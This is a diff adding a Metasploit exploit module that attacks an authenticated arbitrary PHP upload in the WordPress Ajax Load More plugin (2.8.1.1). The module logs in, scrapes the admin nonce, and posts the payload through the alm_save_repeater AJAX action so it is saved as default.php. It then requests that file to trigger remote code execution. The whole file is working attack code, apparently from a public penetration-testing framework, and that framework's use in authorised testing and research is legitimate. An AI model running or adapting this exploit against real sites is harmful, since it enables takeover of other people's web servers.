@@ -1,0 +1,122 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Wordpress Ajax Load More PHP Upload Vulnerability',
+      'Description'    => %q{
+        This module exploits an arbitrary file upload in the WordPress Ajax Load More
+        version 2.8.1.1. It allows to upload arbitrary php files and get remote code
+        execution. This module has been tested successfully on WordPress Ajax Load More
+        2.8.0 with Wordpress 4.1.3 on Ubuntu 12.04/14.04 Server.
+      },
+      'Author'         =>
+        [
+          'Unknown', # Identify yourself || send an PR here
+          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['WPVDB', '8209']
+        ],
+      'Privileged'     => false,
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Ajax Load More 2.8.1.1', {}]],
+      'DisclosureDate' => 'Oct 10 2015',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('WP_USERNAME', [true, 'A valid username', nil]),
+        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])
+      ], self.class
+    )
+  end
+
+  def check
+    check_plugin_version_from_readme('ajax-load-more', '2.8.1.2')
+  end
+
+  def username
+    datastore['WP_USERNAME']
+  end
+
+  def password
+    datastore['WP_PASSWORD']
+  end
+
+  def get_nonce(cookie)
+    res = send_request_cgi(
+      'method'    => 'GET',
+      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
+      'vars_get'  => {
+        'page'    => 'ajax-load-more-repeaters'
+      },
+      'cookie'    => cookie
+    )
+
+    if res && res.body && res.body =~ /php","alm_admin_nonce":"([a-z0-9]+)"}/
+      return Regexp.last_match[1]
+    else
+      return nil
+    end
+  end
+
+  def exploit
+    vprint_status("#{peer} - Trying to login as #{username}")
+    cookie = wordpress_login(username, password)
+    fail_with(Failure::NoAccess, "#{peer} - Unable to login as: #{username}") if cookie.nil?
+
+    vprint_status("#{peer} - Trying to get nonce")
+    nonce = get_nonce(cookie)
+    fail_with(Failure::Unknown, "#{peer} - Unable to get nonce") if nonce.nil?
+
+    vprint_status("#{peer} - Trying to upload payload")
+
+    # This must be default.php
+    filename = 'default.php'
+
+    print_status("#{peer} - Uploading payload")
+    res = send_request_cgi(
+      'method'      => 'POST',
+      'uri'         => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
+      'vars_post'   => {
+        'action'    => 'alm_save_repeater',
+        'value'     => payload.encoded,
+        'repeater'  => 'default',
+        'type'      => 'default',
+        'alias'     => '',
+        'nonce'     => nonce
+      },
+      'cookie'      => cookie
+    )
+
+    if res
+      if res.code == 200 && res.body.include?('Template Saved Successfully')
+        register_files_for_cleanup(filename)
+      else
+        fail_with(Failure::Unknown, "#{peer} - You do not have sufficient permissions to access this page.")
+      end
+    else
+      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
+    end
+
+    print_status("#{peer} - Calling uploaded file")
+    send_request_cgi(
+      'uri'    => normalize_uri(wordpress_url_plugins, 'ajax-load-more', 'core', 'repeater', filename)
+    )
+  end
+end
